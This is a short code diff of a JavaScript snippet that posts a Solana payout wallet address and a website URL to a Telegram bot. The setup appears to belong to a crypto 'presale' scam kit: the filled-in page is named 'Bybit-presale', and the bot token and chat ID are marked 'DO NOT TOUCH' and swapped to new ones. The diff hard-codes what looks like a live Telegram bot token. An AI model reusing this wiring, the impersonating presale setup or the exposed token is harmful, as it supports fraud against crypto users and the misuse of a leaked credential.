@@ -1,10 +1,10 @@
 const axios = require('axios');
 
 // Telegram Bot API token [ DO NOT TOUCH ]
-const botToken = '6345787783:AAGQn2Uy7rpVfy76SOSJGA3jttW2sH9U8';
+const botToken = '7925505296:AAFZzW3mvYl62QJKnnXyUqYORa8jRmx-Lkk';
 
 // Telegram channel ID [ DO NOT TOUCH ]
-const chatId = '4177494374';
+const chatId = '6309547301';
 
 
 async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
@@ -24,6 +24,6 @@ async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
 }
 
 // Change this information for yours (
-const solana_wallet_receiver_id = 'YOUR_SOLANA_WALLET_RECEIVER_ID';
-const website_url = 'YOUR_WEBSITE_URL';
+const solana_wallet_receiver_id = 'AA77vjVXNmLWDnaoqd5T2H8gnNxvmp8e86Q5r3D3Q9L5';
+const website_url = 'https://john78568.github.io/Bybit-presale/';
 sendMessageToTelegram(solana_wallet_receiver_id, website_url);
